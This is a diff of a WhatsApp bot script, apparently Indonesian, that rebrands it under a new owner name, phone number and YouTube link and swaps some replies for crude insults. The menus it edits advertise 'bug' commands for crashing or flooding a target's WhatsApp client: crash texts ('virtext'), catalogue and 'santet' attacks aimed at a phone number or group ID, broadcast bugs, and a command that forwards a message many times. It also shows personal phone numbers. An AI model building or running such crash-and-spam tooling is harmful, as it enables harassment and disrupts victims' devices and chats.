-*寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎*`
+*𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦*`
 reply(`${result4}`)
 haikal.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted: m }).catch ((err) => m.reply('*Failed to download File*'))
 }
@@ -2734,7 +2734,7 @@ if (isBan) throw sticBanLu(from)
 if (!m.quoted) return m.reply("Reply pesanya!")
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
 quoted.copyNForward(m.chat, true)
 }
@@ -3418,12 +3418,12 @@ await sleep(1500)
 let btn = [{
 urlButton: {
 displayText: 'Youtube',
-url: 'https://youtube.com/channel/UCecZsPalX_hpYdqVoRFsHuA'
+url: 'https://www.youtube.com/channel/UC29cQ2pULR6ECAlAQIPUlfg'
 }
 }, {
 callButton: {
 displayText: 'Number Phone Owner',
-phoneNumber: '+6282264181831'
+phoneNumber: '+17077706888'
 }
 }, {
 quickReplyButton: {
@@ -3459,12 +3459,12 @@ await sleep(1500)
 let btn = [{
 urlButton: {
 displayText: 'Youtube',
-url: 'https://youtube.com/channel/UCecZsPalX_hpYdqVoRFsHuA'
+url: 'https://www.youtube.com/channel/UC29cQ2pULR6ECAlAQIPUlfg'
 }
 }, {
 callButton: {
 displayText: 'Number Phone Owner',
-phoneNumber: '+6282264181831'
+phoneNumber: '+17077706888'
 }
 }, {
 quickReplyButton: {
@@ -3878,9 +3878,9 @@ let latensi = speed() - timestamp
 neww = performance.now()
 oldd = performance.now()
 respon = `
-🌷 RESPONS  ${latensi.toFixed(4)}
-🌷 AKTIF Selama : ${runtime(process.uptime())}
-🌷 RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
+🗿 RESPONS  ${latensi.toFixed(4)}
+🗿 AKTIF Selama : ${runtime(process.uptime())}
+🗿 RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
 🔥 MEMORY NODEJS 🔥
 ${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
 ${cpus[0] ? `_Total CPU Usage_
@@ -3956,49 +3956,49 @@ if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untu
 if (args[0] === "on") {
 if (AntiLink) return m.reply('Sudah Aktif')
 ntilink.push(from)
-m.reply('Succes menyalakan antilink di group ini 🌷')
+m.reply('Succes menyalakan antilink di group ini 🗿')
 } else if (args[0] === "off") {
 if (!AntiLink) return m.reply('Sudah Mati')
 let off = ntilink.indexOf(from)
 ntilink.splice(off, 1)
-m.reply('Succes mematikan antilink di group ini 🌷')
+m.reply('Succes mematikan antilink di group ini 🗿')
 } else {
 m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
 }
 }
 break
 //=================================================//
-case 'dioghoib': {
+case 'satrianyghoib': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!m.isGroup) return groupon(from)
 if (!isAdmins && !isCreator) return sticAdmin(from)
 if (args[0] === "on") {
-if (welcm) return m.reply('Sudah Aktif')
+if (welcm) return m.reply(' y ')
 wlcm.push(from)
-m.reply('Sukses Telah mengaktifkan Bug Ghoib Di group Ini')
+m.reply('y')
 var groupe = await haikal.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
 members.map(async adm => {
 mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
-haikal.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur Bug Admin Dan Penyapa, Harap Berhati-hati`, contextInfo: { mentionedJid : mems }}, {quoted:m})
+haikal.sendMessage(from, {text: `\`\`\`「 Pftttt 」\`\`\`\n\nApaan kontolll`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
-if (!welcm) return m.reply('Sudah Non Aktif')
+if (!welcm) return m.reply('g')
 let off = wlcm.indexOf(from)
 wlcm.splice(off, 1)
-m.reply('Sukses Mematikan Bug Ghoib di group ini')
+m.reply('g')
 } else {
 let buttonsntnsfww = [
-{ buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
-{ buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
+{ buttonId: `${command} on`, buttonText: { displayText: 'y' }, type: 1 },
+{ buttonId: `${command} off`, buttonText: { displayText: 'g' }, type: 1 }
 ]
-await haikal.sendButtonText(m.chat, buttonsntnsfww, `Klick Button Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan !!!
+await haikal.sendButtonText(m.chat, buttonsntnsfww, `Klick Button Di Bawah Ini \n\ny Untuk Mengaktifkan\ng untuk Menonaktifkan !!!
 
-⚠️ DANGERR ⚠️
+⚠️ KAMU NANYA ⚠️
 
- `, `寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`, m)
+ `, `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`, m)
 }
 }
 break
@@ -4083,7 +4083,7 @@ jpegThumbnail:log0,
 caption: `
 ◎ Lib : Multi-Device
 ◎ Terbit : *01-09-1999*
-◎ Owner : 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎
+◎ Owner : 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦
 
 [ 🇲🇨 Ini adalah Bot Pribadi Tekan Link Di Bawah Untuk Bergabung ]`,
 footer: haikal.user.name,
@@ -4097,20 +4097,17 @@ break
 case 'menu': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `◎ Owner : ${botname}
-◎ Lib : Multi-Device
-◎ Terbit : *01-09-1999*
 
-[ INI ADALAH BOT KUSUH MILIK 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎ ]
-▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-┈┈┈┈┈┈ⒽⒺⓁⓁⓄ┈┈┈┈┈
-╭━━╮┈┈┈╭━━╮┈┈┈┈┈
-┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
-╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
-┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
-┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
-╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
-┃┈┈╰━━━╯┈┈╰━┛┈┃┈ 
-_NIH MENUNYA_
+⢀⣤⣤⣤⣤⣤⣤⣤⣿⣦⣤⣤⣤⣤⣤⣤⣴⣿⣤⣤⣤⣤⣤⣤⣤⡀
+  ⢸⡇⠀⠀⠀⠀⠀⠀⠀⢠⣴⠞⠛⠛⠻⢦⡄⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+ ⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣿⣿⢶⣄⣠⡶⣦⣿⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
+ ⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⢻⣿⠶⠟⠻⠶⢿⡿⠀⠀⠀⠀⠀⠀⠀⢸⡇
+   ⣿⠀⠀⠀⠀⠀⠀⢾⣄⣹⣦⣀⣀⣴⢟⣠⡶⠀⠀⠀⠀⠀⠀⣼⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣭⣭⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
+ ⠀⠀⢿⡀⠀⠀⠀⠀⠀⠀⣀⡴⠞⠋⠙⠳⢦⣀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⢀⣤⣼⣧⣤⣤⣤⣤⣤⣿⣭⣤⣤⣤⣤⣤⣤⣭⣿⣤⣤⣤⣤⢧
+HIIIIIIIIIIIIIIIIII
+_This Menu Bot _
 ┏━━⊱
 ┣❏➥ bugmenu
 ┣❏➥ scraperimage
@@ -4132,21 +4129,15 @@ _NIH MENUNYA_
 ┗━━⊱
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-*NOTE*
-╭╮╮╱▔▔▔▔╲╭╭╮
- ╰╲╲▏▂╲╱▂▕╱╱╯
- ┈┈╲▏▇▏▕▇▕╱┈┈
- ┈┈╱╲▔▕▍▔╱╲┈┈
- ╭╱╱ ▕╋╋╋╋▏╲╲╮
- ╰╯╯┈╲▂▂╱┈╰╰ 
-contact me wa.me/6282264181831
+*My WhatsApp*
+contact me wa.me/17077706888
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 Base Script
-©寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`, contextInfo:{"externalAdReply": {"title": `SC 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,"body": `Selamat ${salam} kak ${pushname}`,
+𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 `, contextInfo:{"externalAdReply": {"title": `SC 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/channel/UCecZsPalX_hpYdqVoRFsHuA`,
-thumbnailUrl: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg', 
+sourceUrl: `https://www.youtube.com/channel/UC29cQ2pULR6ECAlAQIPUlfg`,
+thumbnailUrl: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg', 
 }
 }}, { quoted:m})
 }
@@ -4160,82 +4151,59 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `© Hay Kak ${pushname} �
 ◎ Lib : Multi-Device
 ◎ Terbit : *01-09-1999*
 
-┈┈┈┈┈┈ⒽⒺⓁⓁⓄ┈┈┈┈┈
-╭━━╮┈┈┈╭━━╮┈┈┈┈┈
-┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
-╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
-┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
-┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
-╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
-┃┈┈╰━━━╯┈┈╰━┛┈┃┈ 
-
-[ BUG MENU HANYA BISA DIGUNAKAN OLEH OWNER🔥]
-▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-
-╔══════[ VIP 😈 ]══════⊱
-╠➢🌷 [ Jumlah ] #bugnew
+⢀⣤⣤⣤⣤⣤⣤⣤⣿⣦⣤⣤⣤⣤⣤⣤⣴⣿⣤⣤⣤⣤⣤⣤⣤⡀
+  ⢸⡇⠀⠀⠀⠀⠀⠀⠀⢠⣴⠞⠛⠛⠻⢦⡄⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+ ⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣿⣿⢶⣄⣠⡶⣦⣿⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⢻⣿⠶⠟⠻⠶⢿⡿⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀
+   ⣿⠀⠀⠀⠀⠀⠀⢾⣄⣹⣦⣀⣀⣴⢟⣠⡶⠀⠀⠀⠀⠀⠀⣼⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣭⣭⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀⠀⣀⡴⠞⠋⠙⠳⢦⣀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⢀⣤⣼⣧⣤⣤⣤⣤⣤⣿⣭⣤⣤⣤⣤⣤⣤⣭⣿⣤⣤⣤⣤⢧
+╔══════[ ⠀𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 ═════⊱
+╠➢🗿 [ Jumlah ] #bugnew
 ╠➢🔥 628xxx|5|5 #bugnew
-╚════[ 𝐃𝐢𝐨𝐖𝐚𝐬𝐊𝐢𝐧𝐠 ]══════⊱
-▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-
-╔══════[ BUG SPESIAL ]══════⊱
+╔══════[ 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 ]═════⊱
 ╠➢afk { kasih reactions }
-╠➢dioghoib [ on / off ]
-╠➢jagoandio [ reply target ]
+╠➢satrianyghoib [ on / off ]
+╠➢jagoanbangsat [ reply target ]
 ╠➢diosange [ Harus Menjadi Admin ]
 ╠➢bugtiktok [ Link ] - Bug Sw
 ╠➢jadikatalog [ reply sticker ] jumlah
-╚════[ 𝐃𝐢𝐨𝐖𝐚𝐬𝐊𝐢𝐧𝐠 ]══════⊱
-▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-
-╔══════[ BUG TARGET ]══════⊱
-╠➢dioskuy 628xxx
-╠➢diosantet 628xxx@s.whatsapp.net|10|10s
+╚════[ 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 ]══════⊱
+╠➢satrianyskuy 628xxx ( target)
+╠➢satrianysantet 628xxx@s.whatsapp.net|10|10s ( target )
 ╠➢catalogpc 628xxx@s.whatsapp.net|10|10s
-╚════[ 𝐃𝐢𝐨𝐖𝐚𝐬𝐊𝐢𝐧𝐠 ]══════⊱
-▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-
-Ketik > m.chat ( di group dulu🌷)
-╔══════[ BUG GRUB ]══════⊱
-╠➢ampas2 112674448xxx
+╠➢pftt 112674448xxx  ( gc )
 ╠➢santetgc  1237891xxxx@g.us|10|10s
 ╠➢cataloggc 1237891xxxx@g.us|10|10s
-╚════[ 𝐃𝐢𝐨𝐖𝐚𝐬𝐊𝐢𝐧𝐠 ]══════⊱
-▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-
-╔══════[ VIRTEX ]══════⊱
-╠➢diovirtext1 [ jumlah ]
-╠➢diovirtext2 [ jumlah ]
-╠➢diovirtext3 [ jumlah ]
-╠➢diovirtext4 [ jumlah ]
-╠➢diovirtext5 [ jumlah ]
-╠➢diovirtext6 [ jumlah ]
-╠➢diovirtext7 [ jumlah ]
-╠➢diovirtext8 [ jumlah ]
-╠➢diovirtext9 [ jumlah ]
-╠➢diovirtext10 [ jumlah ]
-╚════[ 𝐃𝐢𝐨𝐖𝐚𝐬𝐊𝐢𝐧𝐠 ]══════⊱
-▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-
-╔══════[ 𝐁𝐔𝐆 𝐒𝐏𝐀𝐌 ]══════⊱
+╠➢bangsatvirtext1 [ jumlah ]
+╠➢bangsatvirtext2 [ jumlah ]
+╠➢bangsatvirtext3 [ jumlah ]
+╠➢bangsatvirtext4 [ jumlah ]
+╠➢bangsatvirtext5 [ jumlah ]
+╠➢bangsatvirtext6 [ jumlah ]
+╠➢bangsatvirtext7 [ jumlah ]
+╠➢bangsatvirtext8 [ jumlah ]
+╠➢bangsatvirtext9 [ jumlah ]
+╠➢bangsatvirtext10 [ jumlah ]
 ╠➢bugstik [ jumlah ]
 ╠➢bugie [ jumlah ]
 ╠➢buglokas [ jumlah ]
 ╠➢bugtod [ jumlah ]
 ╠➢bugbokep [ jumlah ]
 ╠➢buginvite [ jumlah ] Pc
-╠➢dioha [ jumlah ]
-╠➢diohi [ jumlah ]
-╠➢diohu [ jumlah ]
-╠➢diohe [ jumlah ]
-╠➢dioba [ jumlah ]
-╠➢diobe [ jumlah ]
-╠➢diobu [ jumlah ]
-╠➢diobi [ jumlah ]
-╠➢dioca [ jumlah ]
-╠➢dioci [ jumlah ]
-╠➢diocu [ jumlah ]
-╠➢dioco [ jumlah ]
+╠➢satrianyha [ jumlah ]
+╠➢satrianyhi [ jumlah ]
+╠➢satrianyhu [ jumlah ]
+╠➢satrianyhe [ jumlah ]
+╠➢satrianyba [ jumlah ]
+╠➢satrianybe [ jumlah ]
+╠➢satrianybu [ jumlah ]
+╠➢satrianybi [ jumlah ]
+╠➢satrianyca [ jumlah ]
+╠➢satrianyci [ jumlah ]
+╠➢satrianycu [ jumlah ]
+╠➢satrianyco [ jumlah ]
 ╠➢bug1 [ jumlah ]
 ╠➢bug2 [ jumlah ]
 ╠➢bug3 [ jumlah ]
@@ -4257,8 +4225,11 @@ Ketik > m.chat ( di group dulu🌷)
 ╠➢troli [ jumlah ]
 ╠➢troli2 [ jumlah ]
 ╠➢spam [ Reply Pesan ]
-╚════[ 𝐃𝐢𝐨𝐖𝐚𝐬𝐊𝐢𝐧𝐠 ]══════⊱
+╚════[ ⠀𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 ]══════⊱
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
+
+Ketik > m.chat ( di group dulu🗿)
+
 
 ╔══════[ JADI BUG ]══════⊱
 ╠➢jadibug1 [ Reply Video Jadi Bug Audio ]
@@ -4266,7 +4237,7 @@ Ketik > m.chat ( di group dulu🌷)
 ╠➢jadibug3 [ Reply Audio Jadi Bug Vn ]
 ╠➢jadibug4 [ Reply Sticker Jadi Bug Gambar ]
 ╠➢jadibug5 [ Reply Gambar Jadi Bug Once ] 
-╚════[ 𝐃𝐢𝐨𝐖𝐚𝐬𝐊𝐢𝐧𝐠 ]══════⊱
+╚════[ ⠀𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 ]══════⊱
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 
 ╔══════[ BUG BROADCAST ]══════⊱
@@ -4274,12 +4245,12 @@ Ketik > m.chat ( di group dulu🌷)
 ╠➢bugbcvideo [ Bug Video Broadcas ]
 ╠➢bugbc audio [ Bug Audio Broadcast ]
 ╠➢bugbctext [ Bug Text Broadcast ]
-╚════[ 𝐃𝐢𝐨𝐖𝐚𝐬𝐊𝐢𝐧𝐠 ]══════⊱`,
-contextInfo:{"externalAdReply": {"title": `SC 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,"body": `Selamat ${salam} kak ${pushname}`,
+╚════[ ⠀𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 ]══════⊱`,
+contextInfo:{"externalAdReply": {"title": `SC 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/channel/UCecZsPalX_hpYdqVoRFsHuA`,
-thumbnailUrl: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg', 
+sourceUrl: `https://www.youtube.com/channel/UC29cQ2pULR6ECAlAQIPUlfg`,
+thumbnailUrl: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg', 
 }
 }}, { quoted:m})
 }
@@ -4294,7 +4265,7 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "productImage": messa.imageMessage,
 "productId": "449756950375071",
 "title": ` © Hay Kak ${pushname} 👋 Selamat ${salam} Apa Yang Bisa Saya Bantu 🙏`,
-"description": ` - © 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎ -
+"description": ` - © 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 -
 
 ◎ Owner : ${botname}
 ◎ Lib : Multi-Device
@@ -4307,10 +4278,10 @@ SILAHKAN KETIK MENU UNTUK MENGGUNAKAN BOT LEBIB LANJUT ✌️`,
 "productImageCount": 1,
 "firstImageId": 1,
 "salePriceAmount1000": "10000000",
-"retailerId": `© 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎ WE ARE NOT MASTOD`,
-"url": "wa.me/6282264181831"
+"retailerId": `© 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 WE ARE NOT MASTOD`,
+"url": "wa.me/17077706888"
 },
-"businessOwnerJid": "6282264181831@s.whatsapp.net",
+"businessOwnerJid": "17077706888@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
@@ -4320,7 +4291,7 @@ break
 case 'soundbot': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
-*[ 🌷 ] soundbot* 
+*[ 🗿 ] soundbot* 
  
 kal
 ngakak
@@ -4334,11 +4305,11 @@ slebew
 cantik
 kesel
 ngeselin`,
-contextInfo:{"externalAdReply": {"title": `SC 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,"body": `Selamat ${salam} kak ${pushname}`,
+contextInfo:{"externalAdReply": {"title": `SC 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/channel/UCecZsPalX_hpYdqVoRFsHuA`,
-thumbnailUrl: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg', 
+sourceUrl: `https://www.youtube.com/channel/UC29cQ2pULR6ECAlAQIPUlfg`,
+thumbnailUrl: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg', 
 }
 }}, { quoted:m})
 }
@@ -4347,7 +4318,7 @@ break
 case 'funnmenu': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
- *[ 🌷 ] funnmenu* 
+ *[ 🗿 ] funnmenu* 
 bagaimanakah
 kapankah
 apakah
@@ -4369,11 +4340,11 @@ huluh
 heleh
 holoh
 delttt]`,
-contextInfo:{"externalAdReply": {"title": `SC 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,"body": `Selamat ${salam} kak ${pushname}`,
+contextInfo:{"externalAdReply": {"title": `SC 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/channel/UCecZsPalX_hpYdqVoRFsHuA`,
-thumbnailUrl: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg', 
+sourceUrl: `https://www.youtube.com/channel/UC29cQ2pULR6ECAlAQIPUlfg`,
+thumbnailUrl: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg', 
 }
 }}, { quoted:m})
 }
@@ -4382,7 +4353,7 @@ break
 case 'primbonmenu': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
- *[ 🌷 ] primbonmenu* 
+ *[ 🗿 ] primbonmenu* 
 nomorhoki
  artimimpi
  artinama
@@ -4413,11 +4384,11 @@ nomorhoki
  masasubur
  zodiak
  shio`,
-contextInfo:{"externalAdReply": {"title": `SC 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,"body": `Selamat ${salam} kak ${pushname}`,
+contextInfo:{"externalAdReply": {"title": `SC 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/channel/UCecZsPalX_hpYdqVoRFsHuA`,
-thumbnailUrl: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg', 
+sourceUrl: `https://www.youtube.com/channel/UC29cQ2pULR6ECAlAQIPUlfg`,
+thumbnailUrl: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg', 
 }
 }}, { quoted:m})
 }
@@ -4426,17 +4397,17 @@ break
 case 'islamiyah': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
-*[ 🌷 ] islamiyah* 
+*[ 🗿 ] islamiyah* 
 iqra
  hadist
  alquran
  juzamma
  tafsirsurah`,
-contextInfo:{"externalAdReply": {"title": `SC 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,"body": `Selamat ${salam} kak ${pushname}`,
+contextInfo:{"externalAdReply": {"title": `SC 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/channel/UCecZsPalX_hpYdqVoRFsHuA`,
-thumbnailUrl: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg', 
+sourceUrl: `https://www.youtube.com/channel/UC29cQ2pULR6ECAlAQIPUlfg`,
+thumbnailUrl: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg', 
 }
 }}, { quoted:m})
 }
@@ -4445,7 +4416,7 @@ break
 case 'beritanews': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
- *[ 🌷 ] beritanews* 
+ *[ 🗿 ] beritanews* 
 merdeka-news
 kontan-news 
 cnbc-news
@@ -4461,11 +4432,11 @@ tempo-news
 antara-news
 cnn-news
 fajar-news `,
-contextInfo:{"externalAdReply": {"title": `SC 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,"body": `Selamat ${salam} kak ${pushname}`,
+contextInfo:{"externalAdReply": {"title": `SC 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/channel/UCecZsPalX_hpYdqVoRFsHuA`,
-thumbnailUrl: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg', 
+sourceUrl: `https://www.youtube.com/channel/UC29cQ2pULR6ECAlAQIPUlfg`,
+thumbnailUrl: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg', 
 }
 }}, { quoted:m})
 }
@@ -4474,7 +4445,7 @@ break
 case 'groupmenu': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
- *[ 🌷 ] Group Menu* 
+ *[ 🗿 ] Group Menu* 
 linkgroup
  ephemeral [di group]
  setppgc /full [image]
@@ -4498,11 +4469,11 @@ linkgroup
  getpic
  penjara
  intro`,
-contextInfo:{"externalAdReply": {"title": `SC 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,"body": `Selamat ${salam} kak ${pushname}`,
+contextInfo:{"externalAdReply": {"title": `SC 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/channel/UCecZsPalX_hpYdqVoRFsHuA`,
-thumbnailUrl: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg', 
+sourceUrl: `https://www.youtube.com/channel/UC29cQ2pULR6ECAlAQIPUlfg`,
+thumbnailUrl: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg', 
 }
 }}, { quoted:m})
 }
@@ -4511,7 +4482,7 @@ break
 case 'voicechanger': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
- *[ 🌷 ] Voice Changer* 
+ *[ 🗿 ] Voice Changer* 
 bass
 blown
 deep
@@ -4523,11 +4494,11 @@ reverse
 robot
 slow
 tupai`,
-contextInfo:{"externalAdReply": {"title": `SC 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,"body": `Selamat ${salam} kak ${pushname}`,
+contextInfo:{"externalAdReply": {"title": `SC 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/channel/UCecZsPalX_hpYdqVoRFsHuA`,
-thumbnailUrl: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg', 
+sourceUrl: `https://www.youtube.com/channel/UC29cQ2pULR6ECAlAQIPUlfg`,
+thumbnailUrl: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg', 
 }
